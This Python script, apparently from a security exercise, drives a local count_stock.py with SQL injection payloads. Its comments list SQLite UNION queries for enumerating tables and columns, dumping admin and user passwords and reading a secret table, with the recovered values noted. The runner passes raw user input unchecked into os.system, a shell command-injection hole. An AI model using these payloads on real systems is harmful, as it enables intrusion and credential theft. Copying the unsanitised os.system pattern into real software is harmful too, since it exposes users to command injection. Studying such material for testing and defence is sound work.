import os
import sys
import json
import subprocess
#This script will call count_stock.py and pass malicious arguments to inject SQL queries and extract confidential information
# Generic SQL injection testing
# 1. "{\"productId\":\"1 OR 1 = 1\"}"

# 2. Get all table names
# "{\"productId\":\"1 UNION SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'\"}"
# "{\"id\":\"1 UNION SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'\"}"

# 3. Get column in table
# "{\"productId\":\"1 UNION SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='product'\"}"
# "{\"id\":\"1 UNION SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='secret'\"}"

#3.1 For a clean output
# "{\"productId\":\"1 UNION SELECT replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,'(')%2b1)),instr((substr(sql,instr(sql,'(')%2b1)),'')),"TEXT",''),"INTEGER",''),"AUTOINCREMENT",''),"PRIMARY KEY",''),"UNIQUE",''),"NUMERIC",''),"REAL",''),"BLOB",''),"NOT NULL",''),",",'~~') FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='user'\"}"

#4. Get admin username and password
# "{\"productId\":\"1 UNION SELECT password FROM user WHERE username='admin'\"}" #p@55w0rd
#4. Get user details and password
# "{\"productId\":\"1 UNION SELECT password FROM user WHERE username='user'\"}" #password

# 5. Get secret data
# "{\"productId\":\"1 UNION SELECT secret FROM secret\"}"  #nosecret

exploit_options = ["0. Get all table names in the Database", "1. Get Column name in a table"]

arguments = raw_input("Enter SQL injection query (in JSON format): \n") #Get input from user
cmd = "python count_stock.py "
# print cmd+arguments
os.system(cmd+arguments)
